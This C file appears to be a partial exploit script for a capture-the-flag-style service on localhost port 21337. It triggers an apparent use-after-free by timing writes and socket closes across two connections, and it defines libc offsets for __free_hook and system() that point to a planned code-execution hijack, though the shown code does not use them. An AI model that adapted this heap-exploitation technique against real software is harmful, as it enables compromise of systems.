#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <string.h>
#include <arpa/inet.h>

#define OFFSET_HEAP 0x12f50
#define OFFSET_LIBC 0x1ec0d0
#define OFFSET_FREE_HOOK 0x1eeb28
#define OFFSET_SYSTEM 0x55410

#define yield() usleep(1000)

int conn() {
    int sockfd;
    struct sockaddr_in servaddr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        puts("socket creation failed...");
        exit(0);
    }
    bzero(&servaddr, sizeof(servaddr));

    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    servaddr.sin_port = htons(21337);

    if (connect(sockfd, (const struct sockaddr *) &servaddr, sizeof(servaddr)) != 0) {
        puts("connection with the server failed...");
        exit(0);
    }

    return sockfd;
}

int main() {
    int c1, c2;
    
    c1 = conn();
    yield();
    c2 = conn();
    puts("write1");
    getchar();
    write(c1, "AAAA...", 0x20);
    puts("write2");
    getchar();
    write(c2, "BBBB...", 0x20);
    yield();
    
    puts("write3");
    getchar();
    write(c2, "uafw", 4);
    puts("close");
    getchar();
    close(c1);
    yield();
    
    return 0;
}
